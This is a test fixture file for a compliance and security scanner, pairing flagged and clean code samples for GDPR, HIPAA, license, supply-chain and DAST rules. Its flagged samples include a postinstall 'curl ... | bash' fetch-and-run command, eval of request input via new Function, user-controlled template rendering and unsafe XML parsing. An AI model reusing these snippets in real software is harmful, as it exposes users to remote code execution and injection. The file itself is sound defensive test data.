// @vitest-environment node
/**
 * Extended BLOCKER fixture data — Governance and compliance rules.
 * COMMIT, LIC, GDPR, SC, EU_AI, HIPAA, DORA, DAST, VERCEL rules.
 */
import type { ExtendedFixture } from './blocker-fixture-harness.test.js';

export const EXTENDED_FIXTURES: ExtendedFixture[] = [
  // ── COMMIT_001 — commit_invalid_format ────────────────────────────────────
  {
    ruleId: 'COMMIT_001',
    // Commit rules match the sentinel path EXACTLY: '.git/COMMIT_EDITMSG'.
    fixtureFilePath: '.git/COMMIT_EDITMSG',
    positiveFixture: 'fixed the bug',
    negativeFixture: 'fix(auth): correct JWT expiry check',
  },
  // ── COMMIT_008 — commit_breaking_no_footer ────────────────────────────────
  {
    ruleId: 'COMMIT_008',
    // Commit rules match the sentinel path EXACTLY: '.git/COMMIT_EDITMSG'.
    fixtureFilePath: '.git/COMMIT_EDITMSG',
    positiveFixture: 'feat!: remove deprecated API endpoints',
    negativeFixture: 'feat!: remove deprecated API endpoints\n\nBREAKING CHANGE: endpoints /v1/user removed',
  },
  // ── VERCEL_001 — vercel_secret_in_config ──────────────────────────────────
  {
    ruleId: 'VERCEL_001',
    fixtureFilePath: 'vercel.json',
    // detect() matches a literal credential in a header value, not the env block.
    positiveFixture: '{ "headers": [{ "value": "Bearer sk-abc123def456" }] }',
    negativeFixture: '{ "env": { "API_KEY": "@api-key-vercel-secret" } }',
  },
  // ── VERCEL_002 — vercel_server_secret_public_prefix ───────────────────────
  {
    ruleId: 'VERCEL_002',
    // GAP (see proof-gate ledger §2): detect() skips every non-source file, so a
    // NEXT_PUBLIC_ secret declared in vercel.json — the canonical place to declare
    // one — is never scanned. This fixture covers the source-file path the rule
    // DOES handle; it deliberately does not assert the uncovered vercel.json case.
    fixtureFilePath: 'src/fixture-VERCEL_002.ts',
    positiveFixture: 'const pw = process.env.NEXT_PUBLIC_DB_PASSWORD;',
    negativeFixture: 'const pw = process.env.DB_PASSWORD;',
  },
  // ── LIC_001 — lic_gpl_in_commercial ──────────────────────────────────────
  {
    // Multi-file rule: detect() correlates package.json against a lockfile and
    // returns [] unless BOTH are present in the same changeset. Needs
    // companionFiles — a single-file fixture can never exercise it.
    ruleId: 'LIC_001',
    fixtureFilePath: 'package.json',
    positiveFixture: '{ "name": "my-app", "version": "1.0.0", "license": "MIT", "private": false, "dependencies": { "gpl-library": "^1.0.0" } }',
    companionFiles: [
      {
        path: 'package-lock.json',
        content: JSON.stringify({
          name: 'my-app',
          lockfileVersion: 3,
          packages: { 'node_modules/gpl-library': { version: '1.0.0', license: 'GPL-3.0' } },
        }),
      },
    ],
  },
  // ── LIC_009 — lic_license_mismatch ───────────────────────────────────────
  {
    ruleId: 'LIC_009',
    fixtureFilePath: 'package.json',
    positiveFixture: '{ "name": "my-app", "license": "Apache-2.0", "dependencies": { "agpl-library": "1.0.0" } }',
    negativeFixture: '{ "name": "my-app", "license": "Apache-2.0", "dependencies": { "apache-lib": "1.0.0" } }',
  },
  // ── GDPR_007 — gdpr_pii_in_logs_external ─────────────────────────────────
  {
    ruleId: 'GDPR_007',
    positiveFixture: 'Sentry.captureException(e, { extra: { user: { email, phone } } });',
    // GAP (ledger §2.4): detect() performs NO PII check — it fires on any line
    // matching the Sentry/Datadog/LogRocket call shape, so a scrubbed call is
    // flagged identically. The only expressible negative is non-Sentry logging.
    negativeFixture: 'logger.error({ userId: user.id }, "request failed");',
  },
  // ── GDPR_011 — gdpr_pii_in_error_response ────────────────────────────────
  {
    ruleId: 'GDPR_011',
    fixturePathHint: 'api',
    positiveFixture: "return res.status(400).json({ error: err.message, email: user.email });",
    negativeFixture: "return res.status(400).json({ error: 'Validation failed', code: 'INVALID_INPUT' });",
  },
  // ── GDPR_016 — gdpr_consent_revocation_missing ────────────────────────────
  {
    ruleId: 'GDPR_016',
    positiveFixture: "await db.user.update({ where: { id }, data: { marketingConsent: true } });",
    negativeFixture: "await db.user.update({ where: { id }, data: { marketingConsent: false } }); await deleteMarketingData(id);",
  },
  // ── GDPR_020 — gdpr_dpia_missing_high_risk ───────────────────────────────
  {
    ruleId: 'GDPR_020',
    positiveFixture: "await processBiometricData(userId, faceEmbedding);",
    negativeFixture: "// DPIA completed — see docs/dpia-biometric-2024.md\nawait processBiometricData(userId, faceEmbedding);",
  },
  // ── SC_002 — sc_missing_lockfile ─────────────────────────────────────────
  // SC_002 fires when a project has package.json but no lockfile.
  // Since detect() checks filesystem (root), we simulate with a JS file in
  // a path that doesn't include the root check short-circuit.
  {
    ruleId: 'SC_002',
    fixtureFilePath: 'package.json',
    positiveFixture: '{ "name": "my-app", "dependencies": { "express": "^4.0.0" } }',
    negativeFixture: '{ "name": "my-app", "dependencies": {} }',
  },
  // ── SC_003 — sc_postinstall_network_fetch ─────────────────────────────────
  {
    ruleId: 'SC_003',
    fixtureFilePath: 'package.json',
    positiveFixture: '{ "scripts": { "postinstall": "curl https://cdn.example.com/setup.sh | bash" } }',
    negativeFixture: '{ "scripts": { "postinstall": "node scripts/setup.js" } }',
  },
  // ── EU_AI_001 — eu_ai_high_risk_no_conformity ────────────────────────────
  {
    ruleId: 'EU_AI_001',
    positiveFixture: "const score = await llm.creditScore(applicant); if (score < 500) await denyCredit(applicant);",
    negativeFixture: "// conformity-assessment.md present\nconst rec = await llm.creditScore(applicant); await queue.humanReview({ rec });",
  },
  // ── EU_AI_002 — eu_ai_prohibited_biometric ───────────────────────────────
  {
    ruleId: 'EU_AI_002',
    positiveFixture: "const match = await llm.facialRecognition(frame);",
    negativeFixture: "// Biometric identification prohibited under EU AI Act Art. 5\n// Use legitimate authentication only",
  },
  // ── HIPAA_001 — hipaa_phi_unencrypted_at_rest ─────────────────────────────
  {
    ruleId: 'HIPAA_001',
    // isPrismaSchema() matches the schema.prisma filename, not any .prisma file.
    fixtureFilePath: 'prisma/schema.prisma',
    positiveFixture: "model Patient { id String @id\n  diagnosis String\n  ssn      String }",
    negativeFixture: "model Patient { id String @id\n  diagnosisEncrypted Bytes\n  ssnEncrypted      Bytes }",
  },
  // ── HIPAA_002 — hipaa_phi_no_tls ──────────────────────────────────────────
  {
    ruleId: 'HIPAA_002',
    positiveFixture: "const data = await fetch('http://phi-service.internal/records/123');",
    negativeFixture: "const data = await fetch('https://phi-service.internal/records/123');",
  },
  // ── HIPAA_003 — hipaa_phi_no_access_control ───────────────────────────────
  {
    ruleId: 'HIPAA_003',
    fixturePathHint: 'api',
    positiveFixture: "export async function GET(req) { return Response.json(await db.patient.findUnique({ where: { id: params.id } })); }",
    // Line-scoped detection: the patient query must not appear on a line that
    // still reads as an unguarded PHI response.
    negativeFixture: 'export async function GET(req) {\n  await requireHIPAARole(req);\n  const record = await loadAuthorizedPatientRecord(req);\n  return Response.json(record);\n}',
  },
  // ── DORA_001 — dora_incident_classification_missing ──────────────────────
  {
    ruleId: 'DORA_001',
    positiveFixture: "await pagerduty.createIncident({ title: 'Payment service down' });",
    // No negativeFixture: the passing case requires
    // `.thesmos/incident-classification.md` to exist on disk, which the
    // single-file fixture model cannot express (ledger §2.3 HARNESS_LIMIT).
  },
  // ── DAST_001 — dast_xml_entity_expansion ─────────────────────────────────
  {
    ruleId: 'DAST_001',
    positiveFixture: 'xml2js.parseString(req.body, (err, result) => handle(result));',
    negativeFixture: "const parser = new XMLParser({ processEntities: false }); const parsed = parser.parse(userXml);",
  },
  // ── DAST_005 — dast_eval_user_input ──────────────────────────────────────
  {
    ruleId: 'DAST_005',
    positiveFixture: "const fn = new Function(req.body.formula); fn();",
    negativeFixture: "const result = safeEval(req.body.formula, allowedVars);",
  },
  // ── DAST_008 — dast_template_injection ───────────────────────────────────
  {
    ruleId: 'DAST_008',
    positiveFixture: "const html = nunjucks.renderString(req.body.template, data);",
    negativeFixture: "const html = nunjucks.render('safe-template.html', { data: sanitize(req.body.data) });",
  },
];
